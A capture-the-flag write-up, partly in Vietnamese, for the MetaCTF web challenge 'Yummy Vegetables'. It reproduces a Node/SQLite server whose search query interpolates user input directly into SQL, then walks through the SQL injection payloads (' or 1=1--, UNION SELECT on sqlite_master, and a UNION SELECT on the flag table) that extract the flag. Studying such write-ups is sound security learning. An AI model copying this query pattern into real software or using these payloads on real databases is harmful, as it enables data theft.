### Yummy Vegetables - web challenge - 300

Challenge description

```
I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.

Here's some sauce to go with the vegetables: index.js
```

http://host.cg21.metaproblems.com:4010/

**Overview** 
```javascript
const express = require('express');
const Ajv = require('ajv');
const sqlite = require('better-sqlite3');

const sleep = (ms) => new Promise((res) => { setTimeout(res, ms) })

// set up express
const app = express();
app.use(express.json());
app.use(express.static('public'));

// ajv request validator
const ajv = new Ajv();
const schema = {
  type: 'object',
  properties: {
    query: { type: 'string' },
  },
  required: ['query'],
  additionalProperties: false
};
const validate = ajv.compile(schema);

// database
const db = sqlite('db.sqlite3');

// search route
app.search('/search', async (req, res) => {
  if (!validate(req.body)) {
    return res.json({
      success: false,
      msg: 'Invalid search query',
      results: [],
    });
  }

  await sleep(5000); // the database is slow :p

  const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;
  let results;
  try {
    results = db.prepare(query).all();
  } catch {
    return res.json({
      success: false,
      msg: 'Something went wrong :(',
      results: [],
    })
  }

  return res.json({
    success: true,
    msg: `${results.length} result(s)`,
    results,
  });
});

// start server
app.listen(3000, () => {
  console.log('Server started');
});
```

Sau click vào liên kết sẽ đưa chúng ta đến với một box tìm kiếm `Search for Vegetables`.  Trong file `index.js` dòng dễ bị tấn công sử dụng mã sau `const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;` 
Sử dụng `' or 1=1--`  mình thấy có list 2 cột hiện ra là `Vegetable Name` và  `Color`. 

Từ mã nguồn thấy rằng cơ sở dữ liệu trong thử thách dùng sqlite, để truy xuất tên table mình dùng`'  union SELECT null,null,tbl_name FROM sqlite_master --` 

```
Color

sqlite_sequence
the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5
veggies
```

Bảng `the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5` có thể chứa flag. Tiến hành truy xuất dữ liệu trong bảng xem kết quả có khả quan không

```
{"query":"' union select null,null,flag from the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5--"}
```

Từ đó mình nhận được flag

```
{
"id":null,
"name":null,
"color":"MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}"
},
```

